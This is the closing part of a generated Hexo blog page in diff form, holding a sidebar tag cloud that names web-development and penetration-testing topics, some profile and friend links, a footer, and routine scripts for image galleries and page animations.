+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Linux/" style="font-size: 15.953816509141074px;" class="tag-cloud-link">Linux</a>
+    
+    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 13.543376836129479px;" class="tag-cloud-link">基础知识</a>
+    
+    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 14.672684172413428px;" class="tag-cloud-link">DNS域名解析</a>
+    
+    <a href="/tags/HTML/" style="font-size: 18.368597715143803px;" class="tag-cloud-link">HTML</a>
+    
+    <a href="/tags/CSS/" style="font-size: 8.540271779111478px;" class="tag-cloud-link">CSS</a>
+    
+    <a href="/tags/php/" style="font-size: 8.026894812376955px;" class="tag-cloud-link">php</a>
+    
+    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 11.056331095224266px;" class="tag-cloud-link">php函数</a>
+    
+    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 19.12777377350255px;" class="tag-cloud-link">简单网站功能实现</a>
+    
+    <a href="/tags/html/" style="font-size: 8.619438119497936px;" class="tag-cloud-link">html</a>
+    
+    <a href="/tags/postman/" style="font-size: 15.358103971956165px;" class="tag-cloud-link">postman</a>
+    
+    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 14.299698008241476px;" class="tag-cloud-link">文件操作</a>
+    
+    <a href="/tags/python/" style="font-size: 9.777947303494365px;" class="tag-cloud-link">python</a>
+    
+    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 17.5744883107863px;" class="tag-cloud-link">变量</a>
+    
+    <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 14.364321848814079px;" class="tag-cloud-link">字符串</a>
+    
+    <a href="/tags/%E5%88%97%E8%A1%A8/" style="font-size: 15.640205734262581px;" class="tag-cloud-link">列表</a>
+    
+    <a href="/tags/%E5%85%83%E7%BB%84/" style="font-size: 15.655962264655502px;" class="tag-cloud-link">元组</a>
+    
+    <a href="/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/" style="font-size: 12.260322604157116px;" class="tag-cloud-link">if条件判断</a>
+    
+    <a href="/tags/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/" style="font-size: 13.15080201060934px;" class="tag-cloud-link">循环语句</a>
+    
+    <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 9.160589961875786px;" class="tag-cloud-link">学习</a>
+    
+    <a href="/tags/PHP/" style="font-size: 11.221799650819676px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/Navicat/" style="font-size: 16.95444520279328px;" class="tag-cloud-link">Navicat</a>
+    
+    <a href="/tags/%E5%AE%89%E8%A3%85/" style="font-size: 9.87320880008729px;" class="tag-cloud-link">安装</a>
+    
+    <a href="/tags/sqlmap%E4%BD%BF%E7%94%A8/" style="font-size: 9.455769345147843px;" class="tag-cloud-link">sqlmap使用</a>
+    
+    <a href="/tags/dirsearch/" style="font-size: 15.919166416135788px;" class="tag-cloud-link">dirsearch</a>
+    
+    <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 9.740022049557254px;" class="tag-cloud-link">sql 注入</a>
+    
+    <a href="/tags/sqlmap/" style="font-size: 13.391431802441986px;" class="tag-cloud-link">sqlmap</a>
+    
+    <a href="/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" style="font-size: 8.870333577761805px;" class="tag-cloud-link">联合查询</a>
+    
+    <a href="/tags/pikachu/" style="font-size: 10.081729371024021px;" class="tag-cloud-link">pikachu</a>
+    
+    <a href="/tags/virtrualbox/" style="font-size: 11.400592512187945px;" class="tag-cloud-link">virtrualbox</a>
+    
+    <a href="/tags/%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 19.83712996761697px;" class="tag-cloud-link">小米范端口扫描</a>
+    
+    <a href="/tags/vue/" style="font-size: 14.892401913282725px;" class="tag-cloud-link">vue</a>
+    
+    <a href="/tags/waf/" style="font-size: 14.86106060716418px;" class="tag-cloud-link">waf</a>
+    
+    <a href="/tags/BurpSuite/" style="font-size: 10.298249991510545px;" class="tag-cloud-link">BurpSuite</a>
+    
+    <a href="/tags/nmap/" style="font-size: 19.784544007344085px;" class="tag-cloud-link">nmap</a>
+    
+    <a href="/tags/%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/" style="font-size: 10.12303910682744px;" class="tag-cloud-link">百度谷歌语法</a>
+    
+    <a href="/tags/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size: 9.68348306667021px;" class="tag-cloud-link">支付逻辑漏洞</a>
+    
+    <a href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" style="font-size: 10.249320693478456px;" class="tag-cloud-link">弱口令</a>
+    
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 9.228743676813068px;" class="tag-cloud-link">博客搭建</a>
+    
+    <a href="/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/" style="font-size: 17.669250463402545px;" class="tag-cloud-link">主题配置</a>
+    
+    <a href="/tags/sql%E7%BB%95%E8%BF%87/" style="font-size: 15.764958540945985px;" class="tag-cloud-link">sql绕过</a>
+    
+    <a href="/tags/sqlmap-tamper/" style="font-size: 18.53673774280695px;" class="tag-cloud-link">sqlmap tamper</a>
+    
+    <a href="/tags/sql%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0/" style="font-size: 19.842235649773276px;" class="tag-cloud-link">sql报错函数</a>
+    
+    <a href="/tags/bool%E5%92%8C%E7%9D%A1%E7%9C%A0%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" style="font-size: 12.750822267679261px;" class="tag-cloud-link">bool和睡眠盲注脚本</a>
+    
+    <a href="/tags/ip%E5%92%8C%E8%B7%AF%E7%94%B1/" style="font-size: 18.71292947293349px;" class="tag-cloud-link">ip和路由</a>
+    
+    <a href="/tags/proxifier/" style="font-size: 12.529956170028562px;" class="tag-cloud-link">proxifier</a>
+    
+    <a href="/tags/wireshark%E6%8A%93%E5%8C%85/" style="font-size: 12.039116125636943px;" class="tag-cloud-link">wireshark抓包</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/tanlinhuitlh/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 明 尘 Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '8'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
